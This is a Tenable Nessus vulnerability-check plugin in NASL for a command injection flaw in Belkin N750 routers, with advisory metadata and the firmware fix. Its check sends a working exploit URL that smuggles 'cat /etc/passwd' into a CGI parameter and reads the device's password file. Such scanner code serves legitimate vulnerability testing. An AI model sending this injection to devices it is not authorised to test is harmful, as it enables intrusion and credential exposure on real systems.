#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(101355);
  script_version("1.3");
  script_cvs_date("Date: 2018/11/15 20:50:16");

  script_name(english:"Belkin N750 Router Command Injection");
  script_summary(english:"Attempts to execute a command on the remote device.");

  script_set_attribute(attribute:"synopsis", value:
"The remote router is affected by a remote command injection
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote Belkin router is affected by a remote command injection
vulnerability due to improper sanitization of user-supplied input.
An unauthenticated, remote attacker can exploit this, via a specially
crafted URL, to execute arbitrary commands on the device.

Note that Nessus has detected this vulnerability by reading the
contents of file /etc/passwd.");
  script_set_attribute(attribute:"see_also", value:"https://www.belkin.com/us/support-article?articleNum=4831");
  script_set_attribute(attribute:"solution", value:
"Apply firmware version 1.10.22 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");

  script_set_attribute(attribute:"vuln_publication_date",value:"2016/10/07");
  script_set_attribute(attribute:"patch_publication_date",value:"2016/10/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/07/10");

  script_set_attribute(attribute:"plugin_type",value:"remote");
  script_set_attribute(attribute:"cpe",value:"x-cpe:/o:belkin:n750_f9k1103_firmware");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017-2018 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("belkin_www_detect.nbin");
  script_require_keys("installed_sw/Belkin WWW");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("install_func.inc");
include("misc_func.inc");
include("http.inc");

get_install_count(app_name:"Belkin WWW", exit_if_zero:TRUE);
port = get_http_port(default:8080, embedded:TRUE);
install = get_single_install(app_name:"Belkin WWW", port:port);

exploit = "/twonky_cmd.cgi?c=drive_added?path=/tmp/%3Bcat%20/etc/passwd";
res = http_send_recv3(method: "GET", item: exploit, port: port, exit_on_fail: TRUE);

if ("root::" >!< res[2] || "/bin/sh" >!< res[2])
{
  audit(AUDIT_HOST_NOT, "an affected Belkin device");
}

security_report_v4(port: port,
  severity: SECURITY_HOLE,
  generic: TRUE,
  cmd: "cat /etc/passwd",
  request: make_list(build_url(qs:exploit, port:port)),
  output: chomp(res[2]));
